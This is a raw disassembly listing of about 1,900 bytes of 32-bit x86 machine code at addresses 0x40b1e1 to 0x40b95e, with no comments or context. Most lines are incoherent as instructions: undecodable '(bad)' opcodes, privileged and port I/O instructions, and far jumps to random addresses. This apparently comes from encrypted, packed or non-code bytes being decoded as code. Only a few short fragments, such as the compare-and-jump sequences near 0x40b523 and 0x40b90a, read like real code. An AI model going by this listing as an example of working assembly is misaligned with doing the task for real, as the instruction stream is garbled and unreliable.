  40b1e1:	loopne 0x40b1ed
  40b1e3:	or     edi,DWORD PTR [ebx+0x31961b58]
  40b1e9:	mov    edx,0x3a7c1d06
  40b1ee:	mov    esi,0xf49c910e
  40b1f3:	lea    edi,[ebx+0x3a54d9ba]
  40b1f9:	xor    ecx,DWORD PTR [edx-0x358127e8]
  40b1ff:	mov    BYTE PTR ds:[edi],al
  40b202:	pop    edi
  40b203:	(bad)  
  40b204:	mov    bl,0x5d
  40b206:	test   BYTE PTR [edx+0x37],bh
  40b209:	xchg   esp,eax
  40b20a:	sbb    eax,0xe1df351e
  40b20f:	into   
  40b210:	test   BYTE PTR [eax],bh
  40b212:	mov    dl,0x99
  40b214:	mov    dl,BYTE PTR [edi+ecx*8+0x22]
  40b218:	push   edi
  40b219:	pop    ecx
  40b21a:	cmp    al,0x67
  40b21c:	mov    esi,ebx
  40b21e:	or     ecx,eax
  40b220:	adc    DWORD PTR [ecx+0x6f27f20d],eax
  40b226:	and    bh,BYTE PTR [esi]
  40b228:	stos   DWORD PTR es:[edi],eax
  40b229:	pop    ecx
  40b22a:	and    DWORD PTR [esi-0x49d14fb6],esi
  40b230:	fwait
  40b231:	shl    DWORD PTR [edx+esi*8+0x3931a8d0],0xd5
  40b239:	push   esp
  40b23a:	cmp    eax,0x8d105232
  40b23f:	mov    al,0xb0
  40b241:	outs   dx,DWORD PTR ds:[esi]
  40b242:	icebp  
  40b243:	mov    cl,BYTE PTR [edi+esi*8-0x2a]
  40b247:	pop    ecx
  40b248:	repnz sbb BYTE PTR [edi+eiz*8],bh
  40b24c:	pop    ebx
  40b24d:	dec    eax
  40b24e:	ins    BYTE PTR es:[edi],dx
  40b24f:	sub    al,0x27
  40b251:	xchg   esi,eax
  40b252:	adc    al,0xc
  40b254:	push   ss
  40b255:	(bad)  
  40b256:	add    dl,BYTE PTR gs:[ebp-0x587ef251]
  40b25d:	daa    
  40b25e:	outs   dx,DWORD PTR ds:[esi]
  40b25f:	xlat   BYTE PTR ds:[ebx]
  40b260:	shl    BYTE PTR [esi],1
  40b262:	icebp  
  40b263:	pop    esi
  40b264:	retf   
  40b265:	stos   BYTE PTR es:[edi],al
  40b266:	in     eax,dx
  40b267:	pop    es
  40b268:	outs   dx,DWORD PTR ds:[esi]
  40b269:	rol    BYTE PTR [edi],0xfc
  40b26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b26e:	pop    es
  40b26f:	inc    edi
  40b270:	es popa 
  40b272:	inc    edx
  40b273:	das    
  40b274:	push   ebp
  40b275:	in     al,dx
  40b276:	xchg   ebx,eax
  40b277:	dec    si
  40b279:	adc    al,0xf6
  40b27b:	or     al,0x89
  40b27d:	inc    ebp
  40b27e:	jb     0x40b2ee
  40b280:	(bad)
  40b283:	mov    ds:0x7e282c06,al
  40b288:	xchg   ebx,eax
  40b289:	xor    al,0xb7
  40b28b:	fiadd  WORD PTR [ecx+0x57]
  40b28e:	and    ecx,esp
  40b290:	push   ebx
  40b291:	pop    edi
  40b292:	test   al,0x45
  40b294:	dec    esp
  40b295:	jle    0x40b234
  40b297:	and    dl,BYTE PTR [edi-0x2088d693]
  40b29d:	push   esp
  40b29e:	fnstcw WORD PTR [esi]
  40b2a0:	dec    ecx
  40b2a1:	int3   
  40b2a2:	outs   dx,DWORD PTR ds:[esi]
  40b2a3:	or     al,BYTE PTR [ebp-0x11]
  40b2a6:	xor    dl,BYTE PTR ds:0x42c09eac
  40b2ac:	or     al,0x26
  40b2ae:	sbb    esi,esi
  40b2b0:	test   DWORD PTR [eax+0x59],edx
  40b2b3:	xor    cl,ah
  40b2b5:	sbb    dl,BYTE PTR [ebx]
  40b2b7:	sbb    DWORD PTR [edx+0x14],eax
  40b2ba:	inc    ecx
  40b2bb:	jo     0x40b31d
  40b2bd:	lea    edx,[esi]
  40b2bf:	fidiv  DWORD PTR [ecx]
  40b2c1:	adc    ch,BYTE PTR [ecx+0x72b6bee2]
  40b2c7:	(bad)  
  40b2c8:	fwait
  40b2c9:	sub    eax,0x9b415cad
  40b2ce:	mov    BYTE PTR [edx-0x7784de2d],ah
  40b2d4:	(bad)  
  40b2d5:	mov    cl,0xc2
  40b2d7:	ins    BYTE PTR es:[edi],dx
  40b2d8:	mov    ebx,0x42db8ce0
  40b2dd:	call   0xca9625dd
  40b2e2:	push   esp
  40b2e3:	sbb    BYTE PTR [ebx+0x28],0x8e
  40b2e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e8:	(bad)  
  40b2ea:	lock nop
  40b2ec:	(bad)  
  40b2ed:	popf   
  40b2ee:	pushf  
  40b2ef:	(bad)  
  40b2f0:	lock adc al,0xff
  40b2f3:	cmp    ecx,DWORD PTR [edx]
  40b2f5:	jmp    0x9eccdb8d
  40b2fa:	xchg   ebp,eax
  40b2fb:	mov    edx,DWORD PTR [esi]
  40b2fd:	clc    
  40b2fe:	mov    bh,0x9c
  40b300:	std    
  40b301:	and    al,0xdf
  40b303:	adc    edi,DWORD PTR [eax]
  40b305:	add    al,0x91
  40b307:	jp     0x40b30b
  40b309:	push   edx
  40b30a:	xchg   edx,eax
  40b30b:	adc    eax,0x77d6265b
  40b310:	add    BYTE PTR [ebp+ecx*4-0x65b9aee0],0xcb
  40b318:	jbe    0x40b29c
  40b31a:	xchg   esp,eax
  40b31b:	pop    eax
  40b31c:	(bad)  
  40b31d:	and    eax,esp
  40b31f:	xchg   edi,eax
  40b320:	mov    al,ds:0x39aaded1
  40b325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b326:	jl     0x40b324
  40b328:	jnp    0x40b39e
  40b32a:	add    ebx,ebp
  40b32c:	stos   BYTE PTR es:[edi],al
  40b32d:	iret   
  40b32e:	call   0x3276a8fd
  40b333:	and    eax,0x73187509
  40b338:	retf   
  40b339:	dec    eax
  40b33a:	adc    DWORD PTR [ecx-0x705909a2],ebx
  40b340:	das    
  40b341:	ror    BYTE PTR [esi+0xc],cl
  40b344:	xor    eax,0x1b204d
  40b349:	push   ebx
  40b34a:	jle    0x40b308
  40b34c:	and    DWORD PTR [ebp+0x4ea6c28b],0xfffffff6
  40b353:	mov    bl,0x73
  40b355:	leave  
  40b356:	addr16 jmp 0xf697:0xc92e2b21
  40b35e:	xchg   esp,eax
  40b35f:	and    DWORD PTR [edx+0x29],0xffffffda
  40b363:	out    dx,al
  40b364:	mov    DWORD PTR [esi-0x62067605],edx
  40b36a:	int    0xb5
  40b36c:	test   bh,ch
  40b36e:	les    edx,FWORD PTR [ecx-0x388edde5]
  40b374:	sti    
  40b375:	sbb    al,0x4e
  40b377:	sub    ecx,DWORD PTR [ebx+eiz*8-0x31aee240]
  40b37e:	dec    ebx
  40b37f:	lahf   
  40b380:	inc    edi
  40b381:	lods   eax,DWORD PTR ds:[esi]
  40b382:	inc    ebp
  40b383:	out    0x71,al
  40b385:	inc    esp
  40b386:	xchg   esp,eax
  40b387:	outs   dx,BYTE PTR ds:[esi]
  40b388:	retf   
  40b389:	jl     0x40b3c1
  40b38b:	pushf  
  40b38c:	fs (bad) 
  40b38e:	pop    ebx
  40b38f:	inc    ebx
  40b390:	and    ebp,DWORD PTR [edi-0x26]
  40b393:	pop    ecx
  40b394:	loop   0x40b3d4
  40b396:	mov    esi,0xaa11bf86
  40b39b:	mov    ecx,0xae6e7ce6
  40b3a0:	out    0x98,al
  40b3a2:	(bad)  [eax]
  40b3a4:	sub    al,0x16
  40b3a6:	out    0x3,eax
  40b3a8:	push   ds
  40b3a9:	cmp    BYTE PTR [ebp-0x2d],0x90
  40b3ad:	in     eax,0x82
  40b3af:	call   0xa7c3:0x1286224f
  40b3b6:	aas    
  40b3b7:	sahf   
  40b3b8:	gs pop eax
  40b3ba:	xchg   DWORD PTR [ecx],edx
  40b3bc:	sbb    edx,ecx
  40b3be:	cmp    al,0x65
  40b3c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3c1:	cwde   
  40b3c2:	shr    BYTE PTR [edx-0x495c4a8e],cl
  40b3c8:	mov    dl,0xff
  40b3ca:	stc    
  40b3cb:	outs   dx,DWORD PTR ds:[esi]
  40b3cc:	das    
  40b3cd:	aad    0x8f
  40b3cf:	mov    ebx,0xa68f06a3
  40b3d4:	adc    al,0x92
  40b3d6:	or     al,BYTE PTR ds:0x261e297a
  40b3dc:	dec    esp
  40b3dd:	sub    ch,BYTE PTR [ebp-0x3e]
  40b3e0:	mov    BYTE PTR cs:[edx-0x5b],0x3d
  40b3e5:	mov    ecx,0x7bde0bf9
  40b3ea:	push   eax
  40b3eb:	test   DWORD PTR [edx-0x3c],edi
  40b3ee:	fdivr  DWORD PTR [esi-0x586f4228]
  40b3f4:	pop    ebp
  40b3f5:	jbe    0x40b448
  40b3f7:	xor    edi,DWORD PTR [edx+esi*2]
  40b3fa:	dec    edx
  40b3fb:	jb     0x40b435
  40b3fd:	inc    edi
  40b3fe:	add    ecx,DWORD PTR [esi]
  40b400:	fs dec ebp
  40b402:	dec    BYTE PTR ds:[ebp-0x19]
  40b406:	pushf  
  40b407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b408:	mov    ebp,0x6c45eaeb
  40b40d:	xor    esp,DWORD PTR [esi]
  40b40f:	xchg   BYTE PTR [ecx+0x7c8ec47b],dl
  40b415:	fistp  QWORD PTR ds:0xa96b24e3
  40b41b:	bts    DWORD PTR [edi+0x6b40d8ad],ebx
  40b422:	mov    BYTE PTR [edx],ah
  40b424:	pop    ebp
  40b425:	xor    DWORD PTR [eax+0x44],ebx
  40b428:	aad    0x61
  40b42a:	mov    eax,0x56525b70
  40b42f:	rol    DWORD PTR [edx],0x4d
  40b432:	gs call 0x544279d9
  40b438:	sub    dl,ch
  40b43a:	xor    BYTE PTR [edx],cl
  40b43c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b43e:	inc    esp
  40b43f:	jmp    0x96ca:0xc0f0c69e
  40b446:	mov    ebx,0xc4837fb4
  40b44b:	fisttp DWORD PTR es:[ebp-0x5f7ee98c]
  40b452:	loope  0x40b480
  40b454:	shl    BYTE PTR [eax-0x12],cl
  40b457:	push   ecx
  40b458:	es test ebx,0x8be4c21d
  40b45f:	push   esp
  40b460:	pop    esi
  40b461:	or     dh,BYTE PTR [ecx+0x17830810]
  40b467:	mov    bh,0x10
  40b469:	jo     0x40b4b3
  40b46b:	lahf   
  40b46c:	pop    ebx
  40b46d:	repz loop 0x40b402
  40b470:	test   DWORD PTR [eax-0x63fe52d6],0x49499baa
  40b47a:	mov    ds:0x53796d9b,al
  40b47f:	hlt    
  40b480:	iret   
  40b481:	pop    edx
  40b482:	inc    ebp
  40b483:	cmp    eax,0xeccd495b
  40b488:	xchg   esi,eax
  40b489:	mov    dl,0x11
  40b48b:	mov    al,0xf3
  40b48d:	arpl   WORD PTR [ebp+0x30],di
  40b490:	xchg   ebx,eax
  40b491:	retf   
  40b492:	fcomp  DWORD PTR [ebx]
  40b494:	aad    0xf0
  40b496:	inc    edi
  40b497:	hlt    
  40b498:	jle    0x40b46d
  40b49a:	dec    esp
  40b49b:	retf   
  40b49c:	pop    ss
  40b49d:	clc    
  40b49e:	ins    DWORD PTR es:[edi],dx
  40b49f:	mov    DWORD PTR [esi],ebx
  40b4a1:	sub    esp,eax
  40b4a3:	inc    eax
  40b4a4:	or     eax,0x95630210
  40b4a9:	inc    esi
  40b4aa:	ins    BYTE PTR es:[edi],dx
  40b4ab:	push   ebx
  40b4ac:	lock sbb ebp,edi
  40b4af:	xchg   esi,eax
  40b4b0:	lods   eax,DWORD PTR ds:[esi]
  40b4b1:	or     DWORD PTR [eax],esi
  40b4b3:	stos   BYTE PTR es:[edi],al
  40b4b4:	in     eax,0x7d
  40b4b6:	mov    bl,0xfc
  40b4b8:	ror    BYTE PTR [ebx],0xb9
  40b4bb:	div    DWORD PTR [ebx-0x1517f10d]
  40b4c1:	nop
  40b4c2:	push   edi
  40b4c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4c4:	push   edi
  40b4c5:	es jae 0x40b457
  40b4c8:	fs xor cl,cl
  40b4cb:	repnz test esi,ebx
  40b4ce:	dec    esp
  40b4cf:	cmp    al,0xec
  40b4d1:	xchg   edi,eax
  40b4d2:	mov    edx,0xd4ec0d82
  40b4d7:	jno    0x40b4e2
  40b4d9:	cmp    ebp,DWORD PTR [edi]
  40b4db:	add    esp,DWORD PTR [ecx-0x41]
  40b4de:	and    edx,edi
  40b4e0:	or     ebx,DWORD PTR [ecx+edx*8-0x1b]
  40b4e4:	sub    BYTE PTR [esi+0x17],dh
  40b4e7:	push   edi
  40b4e8:	cdq    
  40b4e9:	in     eax,dx
  40b4ea:	out    dx,eax
  40b4eb:	dec    eax
  40b4ec:	cmp    esp,DWORD PTR [esi-0x1756becd]
  40b4f2:	mov    DWORD PTR ds:0x7c1c4d39,ecx
  40b4f8:	xor    BYTE PTR ds:0xe7007f8c,al
  40b4fe:	shr    DWORD PTR [edi],0xe0
  40b501:	ret    0x120b
  40b504:	popf   
  40b505:	push   ds
  40b506:	xchg   ebp,eax
  40b507:	nop
  40b508:	es aaa 
  40b50a:	fist   WORD PTR [esi-0x6e]
  40b50d:	sbb    bh,BYTE PTR [eax]
  40b50f:	sub    DWORD PTR [ebp+edi*2-0x5ce2258c],edx
  40b516:	mov    bl,0x62
  40b518:	dec    ecx
  40b519:	push   ds
  40b51a:	push   ecx
  40b51b:	mov    ebx,0x81e3d585
  40b520:	imul   edx,edi
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	mov    al,ds:0xc110a07b
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b571
  40b55c:	push   ss
  40b55d:	hlt    
  40b55e:	lock pop eax
  40b560:	out    0x32,al
  40b562:	mov    al,ds:0x70554195
  40b567:	leave  
  40b568:	jmp    0x8e00:0x8c4545e8
  40b56f:	out    0xe8,eax
  40b571:	ins    DWORD PTR es:[edi],dx
  40b572:	loop   0x40b5bb
  40b574:	adc    eax,0x3c4e655c
  40b579:	push   eax
  40b57a:	xchg   edx,eax
  40b57b:	jmp    0x95fd8b43
  40b580:	loop   0x40b5c8
  40b582:	int3   
  40b583:	(bad)  
  40b584:	jmp    FWORD PTR ds:0xdda13260
  40b58a:	dec    esi
  40b58b:	pop    ebx
  40b58c:	xlat   BYTE PTR ds:[ebx]
  40b58d:	leave  
  40b58e:	fs in  eax,0x24
  40b591:	popf   
  40b592:	fldcw  WORD PTR [ebx-0x31e5a060]
  40b598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b599:	idiv   DWORD PTR ds:0x4e5e57d8
  40b59f:	jb     0x40b52f
  40b5a1:	mov    eax,0x2aef5bb8
  40b5a6:	in     eax,0x7c
  40b5a8:	mov    edi,fs
  40b5aa:	pusha  
  40b5ab:	loop   0x40b5da
  40b5ad:	repz xlat BYTE PTR ds:[ebx]
  40b5af:	mov    BYTE PTR [edi-0xbdade88],bl
  40b5b5:	sub    ebp,esi
  40b5b7:	and    BYTE PTR [ecx+0x4f],bl
  40b5ba:	test   eax,0x785e261c
  40b5bf:	out    dx,eax
  40b5c0:	addr16 jl 0xdac101a2
  40b5c7:	loop   0x40b571
  40b5c9:	repnz xchg edi,eax
  40b5cb:	cld    
  40b5cc:	test   esp,ebx
  40b5ce:	push   cs
  40b5cf:	inc    esi
  40b5d0:	xor    esp,DWORD PTR [edi]
  40b5d2:	and    eax,0xa96f931b
  40b5d7:	inc    edi
  40b5d8:	mov    ds:0xc2e8c32a,al
  40b5dd:	mov    eax,ds:0x5a1a220f
  40b5e2:	and    al,0x7a
  40b5e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5e5:	add    eax,0x631ba8a
  40b5ea:	adc    eax,0x4c87b08f
  40b5ef:	add    eax,0x37c8af4f
  40b5f4:	fadd   st,st(3)
  40b5f6:	or     ecx,DWORD PTR [eax+0x5a]
  40b5f9:	ja     0x40b5a4
  40b5fb:	xchg   ecx,eax
  40b5fc:	sahf   
  40b5fd:	imul   esi,DWORD PTR [ebp-0x76],0x8d3519ef
  40b604:	call   0x304b:0x9abcf270
  40b60b:	xchg   ecx,eax
  40b60c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b60d:	inc    esp
  40b60e:	int3   
  40b60f:	int3   
  40b610:	xchg   esi,eax
  40b611:	inc    edx
  40b612:	jnp    0x40b62f
  40b614:	pop    edx
  40b615:	aas    
  40b616:	outs   dx,DWORD PTR ds:[esi]
  40b617:	jg     0x40b63a
  40b619:	sub    DWORD PTR [edx],eax
  40b61b:	sahf   
  40b61c:	sbb    al,0xcc
  40b61e:	lods   eax,DWORD PTR ds:[esi]
  40b61f:	hlt    
  40b620:	imul   ecx,ebx,0xffffffe4
  40b623:	sbb    esi,DWORD PTR [edx]
  40b625:	div    BYTE PTR [ecx-0x6e6b7544]
  40b62b:	and    dl,BYTE PTR [eax]
  40b62d:	(bad)  
  40b62e:	sti    
  40b62f:	das    
  40b630:	xchg   ecx,eax
  40b631:	cmp    ebx,DWORD PTR [edx-0x3a29f62b]
  40b637:	xchg   edi,eax
  40b638:	mov    bl,0xe5
  40b63a:	mov    DWORD PTR [esi],ebx
  40b63c:	arpl   sp,di
  40b63e:	cdq    
  40b63f:	sub    DWORD PTR [edx+0x42],edi
  40b642:	jp     0x40b5f6
  40b644:	lods   eax,DWORD PTR ds:[esi]
  40b645:	out    dx,al
  40b646:	mov    eax,0xc22b9700
  40b64b:	(bad)  
  40b64c:	call   0x98151ed1
  40b651:	(bad)
  40b656:	icebp  
  40b657:	push   edx
  40b658:	xchg   esp,eax
  40b659:	cmp    DWORD PTR [eax],esi
  40b65b:	fild   QWORD PTR [eax-0x3f55f1ef]
  40b661:	cmp    al,0xb5
  40b663:	call   0xab5c71d7
  40b668:	adc    eax,0xfe4244d8
  40b66d:	ins    DWORD PTR es:[edi],dx
  40b66e:	pop    edx
  40b66f:	mov    ah,0x9b
  40b671:	dec    edi
  40b672:	lds    ecx,FWORD PTR [ebp-0x7479e33b]
  40b678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b679:	in     eax,0x9b
  40b67b:	jmp    0x2f0c:0x3cc1986c
  40b682:	sbb    al,0xba
  40b684:	cld    
  40b685:	cmp    BYTE PTR [edx],0x24
  40b688:	test   DWORD PTR gs:[edx+0x62],edx
  40b68c:	lds    edi,FWORD PTR [esi-0xf102d64]
  40b692:	loop   0x40b630
  40b694:	inc    ecx
  40b695:	sub    DWORD PTR [esi-0x14],ecx
  40b698:	push   eax
  40b699:	out    dx,al
  40b69a:	(bad)  
  40b69b:	mov    ebx,0x6ab2c93a
  40b6a0:	mov    ?,esp
  40b6a2:	xor    DWORD PTR [esi-0x71],esp
  40b6a5:	out    dx,al
  40b6a6:	lahf   
  40b6a7:	xor    eax,ebp
  40b6a9:	cmp    eax,0xc5eafcc7
  40b6ae:	test   BYTE PTR [edi-0xadb2da9],ch
  40b6b4:	mov    al,ds:0x80bf2653
  40b6b9:	dec    edi
  40b6ba:	shr    ch,cl
  40b6bc:	jecxz  0x40b658
  40b6be:	sub    esi,DWORD PTR [edi+0x35]
  40b6c1:	jmp    FWORD PTR [esi-0x3dc0b1e0]
  40b6c7:	xor    BYTE PTR [ecx-0x61817d5e],0xe1
  40b6ce:	ror    BYTE PTR [edi+0x20],cl
  40b6d1:	cmc    
  40b6d2:	shl    bh,cl
  40b6d4:	mov    bl,0x7
  40b6d6:	je     0x40b72b
  40b6d8:	and    bl,BYTE PTR [esi-0x52]
  40b6db:	sbb    al,0xe4
  40b6dd:	mov    ebx,ecx
  40b6df:	xor    BYTE PTR [ebx-0x2a],bl
  40b6e2:	xchg   edx,eax
  40b6e3:	loopne 0x40b693
  40b6e5:	mov    ecx,0x1c9cc54f
  40b6ea:	gs mov dl,0x2c
  40b6ed:	data16 fstp DWORD PTR [ecx]
  40b6f0:	sbb    al,0x21
  40b6f2:	inc    edi
  40b6f3:	bound  esp,QWORD PTR [ebp*4+0x3045c055]
  40b6fa:	or     eax,0xdf40c3db
  40b6ff:	mov    cl,0xba
  40b701:	frstor [edi+ebx*2-0x7]
  40b705:	mov    eax,0x2474e725
  40b70a:	in     eax,dx
  40b70b:	mov    dl,0x64
  40b70d:	sbb    eax,0x31abe335
  40b712:	and    DWORD PTR [edi],esp
  40b714:	cmc    
  40b715:	mov    ds:0x55dd3034,eax
  40b71a:	js     0x40b71b
  40b71c:	or     al,0xe0
  40b71e:	daa    
  40b71f:	jecxz  0x40b72e
  40b721:	out    dx,al
  40b722:	cmp    DWORD PTR [ebx+0x3d8d1289],0xc3eff3af
  40b72c:	inc    ebx
  40b72d:	retf   0xc12b
  40b730:	ins    BYTE PTR es:[edi],dx
  40b731:	mov    dl,BYTE PTR [edx+0x394c0a7c]
  40b737:	push   es
  40b738:	sar    esp,1
  40b73a:	test   eax,0x75c81508
  40b73f:	(bad)  
  40b740:	mov    dh,0xa2
  40b742:	sahf   
  40b743:	add    BYTE PTR [edi+0x4],0x15
  40b747:	and    ecx,0xf2433f53
  40b74d:	adc    ebx,edx
  40b74f:	rcl    BYTE PTR [edx],0x6d
  40b752:	mov    BYTE PTR [ecx+0x69e4daf2],ch
  40b758:	dec    esp
  40b759:	fisttp QWORD PTR [ebp+0x28]
  40b75c:	hlt    
  40b75d:	inc    ebx
  40b75e:	test   BYTE PTR [esi-0x3e271f73],ah
  40b764:	jl     0x40b7dd
  40b766:	pusha  
  40b767:	xlat   BYTE PTR ds:[ebx]
  40b768:	lock sbb DWORD PTR [edi],0x54
  40b76c:	aam    0x15
  40b76e:	xchg   esi,eax
  40b76f:	fild   QWORD PTR [ebx-0x3a06cc96]
  40b775:	dec    edx
  40b776:	clc    
  40b777:	sti    
  40b778:	and    ebx,DWORD PTR [ebp-0x6e74f404]
  40b77e:	cwde   
  40b77f:	push   esp
  40b780:	mov    esi,0xd1c952b5
  40b785:	add    eax,0x29079cb1
  40b78a:	mov    edi,0xe6a53766
  40b78f:	vcvtss2sd xmm5,xmm3,DWORD PTR ds:0xd98150ce
  40b797:	repnz nop
  40b799:	mov    ds,WORD PTR [eax+esi*4+0x6f]
  40b79d:	sub    eax,0x86b2bf24
  40b7a2:	mov    WORD PTR [esi-0x13],?
  40b7a5:	or     al,0x20
  40b7a7:	pop    eax
  40b7a8:	mov    edi,0x6a5b48ae
  40b7ad:	sub    ah,BYTE PTR [ecx+0x67e39ef5]
  40b7b3:	xchg   BYTE PTR [eax-0x27721e8f],cl
  40b7b9:	jns    0x40b7e3
  40b7bb:	test   eax,0xeafa25e1
  40b7c0:	mov    dl,0xf6
  40b7c2:	xchg   esi,eax
  40b7c3:	outs   dx,DWORD PTR ds:[esi]
  40b7c4:	stos   BYTE PTR es:[edi],al
  40b7c5:	bnd js 0x40b770
  40b7c8:	xchg   ebp,eax
  40b7c9:	out    0x98,eax
  40b7cb:	jg     0x40b79e
  40b7cd:	pop    edx
  40b7ce:	sbb    esp,0xffffffa6
  40b7d1:	rol    DWORD PTR [ebx-0x4db59080],cl
  40b7d7:	mov    DWORD PTR [eax-0x3f5c90c3],ecx
  40b7dd:	lock ror DWORD PTR [edx],cl
  40b7e0:	lahf   
  40b7e1:	loopne 0x40b799
  40b7e3:	adc    cl,BYTE PTR [ecx+0x7c]
  40b7e6:	fnstcw WORD PTR [edx]
  40b7e8:	cli    
  40b7e9:	pop    ss
  40b7ea:	push   esi
  40b7eb:	mov    cl,BYTE PTR ds:0x22636819
  40b7f1:	push   ebx
  40b7f2:	fcmovnb st,st(6)
  40b7f4:	dec    ecx
  40b7f5:	test   edi,ebp
  40b7f7:	xchg   ebp,eax
  40b7f8:	mov    eax,0x43ae07c1
  40b7fd:	push   es
  40b7fe:	cmp    esp,edx
  40b800:	mov    edx,0x96074d36
  40b805:	ins    DWORD PTR es:[edi],dx
  40b806:	iret   
  40b807:	and    BYTE PTR [edx+0x37],ch
  40b80a:	pop    ds
  40b80b:	les    ebx,FWORD PTR [ecx-0x31]
  40b80e:	shr    DWORD PTR [ecx],cl
  40b810:	sub    DWORD PTR [ebp+0x26],ebx
  40b813:	jae    0x40b7f1
  40b815:	inc    ebx
  40b816:	dec    esp
  40b817:	or     al,0x48
  40b819:	mov    eax,0x13c15579
  40b81e:	pop    edx
  40b81f:	cmp    al,0x27
  40b822:	inc    ebp
  40b823:	sub    cl,BYTE PTR [eax+0x4a30fb34]
  40b829:	cmc    
  40b82a:	jo     0x40b83c
  40b82c:	arpl   si,ax
  40b82e:	adc    al,0x59
  40b830:	mov    ch,0xbc
  40b832:	ret    0xc38c
  40b835:	dec    ecx
  40b836:	(bad)  
  40b837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b838:	sbb    BYTE PTR [edi+ebp*8+0x7f],cl
  40b83c:	adc    DWORD PTR [ecx+0x29],edi
  40b83f:	mov    BYTE PTR [ebx+0x7b],bh
  40b842:	addr16 test al,0xb7
  40b845:	addr16 push es
  40b847:	and    al,0x7e
  40b849:	fld    TBYTE PTR [esi+0x1c884d67]
  40b84f:	mov    al,cs:0xa54a4f86
  40b855:	jnp    0x40b845
  40b857:	xchg   ecx,eax
  40b859:	sbb    edx,DWORD PTR [edi-0x224aa7d2]
  40b85f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b860:	xor    bl,ch
  40b862:	push   eax
  40b863:	cmc    
  40b864:	ss cdq 
  40b866:	dec    ecx
  40b867:	dec    edx
  40b868:	xchg   edx,eax
  40b869:	fpatan 
  40b86b:	addr16 jo 0x40b8ec
  40b86e:	sub    eax,0x3a3b7c92
  40b873:	(bad)  
  40b875:	(bad)  
  40b876:	jbe    0x40b840
  40b878:	add    BYTE PTR [esi-0x6f],dl
  40b87b:	xchg   ecx,eax
  40b87c:	inc    ecx
  40b87d:	pop    ebx
  40b87e:	test   BYTE PTR [esi+0x1c09418],ch
  40b884:	sbb    BYTE PTR [edx-0x752a414a],bh
  40b88a:	mov    ebp,0x69c28c66
  40b88f:	imul   ebx,DWORD PTR [esi+0x69],0x4d
  40b893:	popf   
  40b894:	xor    DWORD PTR [eax-0x21],ebp
  40b897:	push   es
  40b898:	call   0x725f:0x8a131b6e
  40b89f:	cmp    eax,0xcce9822c
  40b8a4:	test   BYTE PTR ds:0xb59bad92,dh
  40b8aa:	aas    
  40b8ab:	push   0xb7392e6c
  40b8b0:	xor    ebp,ecx
  40b8b2:	ret    0xed55
  40b8b5:	mov    ebp,0xac0c74ac
  40b8ba:	adc    DWORD PTR [eax],ecx
  40b8bc:	pusha  
  40b8bd:	pop    eax
  40b8be:	es inc edi
  40b8c0:	sbb    al,0xf
  40b8c2:	xor    al,0x52
  40b8c4:	mov    ebx,0x32439613
  40b8c9:	adc    BYTE PTR [ebp-0x1aab4f0],dl
  40b8cf:	pop    ecx
  40b8d0:	arpl   WORD PTR [ebx-0x4c],di
  40b8d3:	sub    ah,BYTE PTR [esi-0x46]
  40b8d6:	in     eax,0x0
  40b8d8:	mov    esi,0x3f916e
  40b8dd:	xor    al,0xe1
  40b8df:	outs   dx,DWORD PTR ds:[esi]
  40b8e0:	cmp    al,0xe
  40b8e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8e3:	jg     0x40b8e2
  40b8e5:	mov    al,0xa5
  40b8e7:	je     0x40b875
  40b8e9:	add    BYTE PTR [esi],dh
  40b8eb:	data16 cs jp 0x40b88a
  40b8ef:	test   al,0x68
  40b8f1:	mov    BYTE PTR [ecx-0x5c3902a3],dl
  40b8f7:	stos   BYTE PTR es:[edi],al
  40b8f8:	mov    DWORD PTR [edx+0x7d8b1642],0x33d033fc
  40b902:	clc    
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x1fea66fb],cl
  40b949:	pop    ds
  40b94a:	cmp    ah,BYTE PTR [eax-0x7d]
  40b94d:	jo     0x40b9bf
  40b94f:	lahf   
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b940
  40b954:	fisttp QWORD PTR [eax]
  40b956:	(bad)  
  40b957:	sub    ch,BYTE PTR [esi+0x35]
  40b95a:	(bad)  
  40b95c:	mov    bl,0xe2
  40b95e:	jne    0x40b93e
